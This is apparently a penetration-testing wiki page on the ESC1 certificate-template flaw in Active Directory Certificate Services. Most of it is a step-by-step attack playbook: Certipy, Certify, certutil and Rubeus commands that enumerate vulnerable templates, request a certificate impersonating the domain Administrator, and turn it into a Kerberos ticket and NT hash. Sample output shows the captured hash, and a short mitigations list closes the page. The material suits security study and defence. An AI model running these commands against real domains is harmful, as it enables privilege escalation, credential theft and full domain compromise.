# ESC1

## Description

ESC1 is a privilege escalation vulnerability in certificate templates that allows any user with enrollment rights to supply a subjectAltName (SAN) for any other user or machine in Active Directory in the environment from the Certificate Authority (CA) , this allows the requesting user to receive a certificate for the targeted user and in turn, authenticate as them with the received certificate.

### Requirements for attack path

* ENROLLEE\_SUPPLIES\_SUBJECT flag in the certificate template
* Enrollment rights granted to a user or group for which we have access to
* Manager approval not enabled
* Authorized signature are not required

## Linux

### Enumeration

{% code overflow="wrap" %}
```powershell
certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -vulnerable -stdout
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

### Performing the attack

{% code overflow="wrap" %}
```python
certipy req -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2  -template 'ESC1' -upn 'administrator@security.local' -sid S-1-5-21-13999771-2333344039-1820745628-500
```
{% endcode %}

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 51
[*] Got certificate with UPN 'administrator@security.local'
[*] Certificate object SID is 'S-1-5-21-13999771-2333344039-1820745628-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

{% code overflow="wrap" %}
```python
certipy auth -pfx administrator.pfx -username 'administrator' -domain 'security.local' -dc-ip 10.10.10.100
```
{% endcode %}

```
[*] Using principal: administrator@security.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@security.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

## Windows

### &#x20;Enumeration

```powershell
.\Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### Performing the attack

Reuqest a certificate for the template vulnerable to ESC1 and specify a SAN for the user we wish to compromise (/altname:).

{% hint style="warning" %}
For accuracy and to avoid certificate mismatch issues we should always aim to provide the /sid parameter which should be the value of the UPN we are targeting (administrator@security.local in the example below).
{% endhint %}

{% code overflow="wrap" %}
```powershell
.\Certify.exe request /ca:CA.SECURITY.LOCAL\SECURITY-CA-CA /template:ESC1 /altname:security\Administrator /sid:S-1-5-21-13999771-2333344039-1820745628-500
```
{% endcode %}

Take the private key and certificate output and place them into seperate files.

{% code title="cert.key" %}
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzyqzlf9NI2sbkAAiJ
-----END RSA PRIVATE KEY-----
```
{% endcode %}

{% code title="cert.pem" %}
```
-----BEGIN CERTIFICATE-----
MIIGeDCCBWCgAwIBAgITIwAAAFhhlVOMQ7
-----END CERTIFICATE-----
```
{% endcode %}

Then merge them together with certutil to create a .pfx file.

```powershell
certutil -MergePFX .\cert.pem .\cert.pfx
```

Use the converted certificate file with Rubeus to either request a NTLM hash or a Kerberos TGT.

{% code overflow="wrap" %}
```powershell
# Get NTLM Hash
.\Rubeus.exe asktgt /user:security\Administrator /certificate:admin.pfx /getcredentials

# Get TGT
.\Rubeus.exe asktgt /user:security\Administrator /certificate:admin.pfx /nowrap
```
{% endcode %}

```
< -- Snip -->

  ServiceName              :  krbtgt/security
  ServiceRealm             :  SECURITY.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  SECURITY.LOCAL
  StartTime                :  05/03/2025 18:06:36
  EndTime                  :  06/03/2025 04:06:36
  RenewTill                :  12/03/2025 18:06:36
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  CpuuZvtyqrp9XO0V1OL/kg==
  ASREP (key)              :  E7A981462C4B5115AB41BE5540D573E6

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## Mitigations

* Remove the ENROLLEE\_SUPPLIES\_SUBJECT flag from the certificate
* Require manager aprovals on the certificate
* Require authorized signatures
* Remove weak enrollement permissions from the template
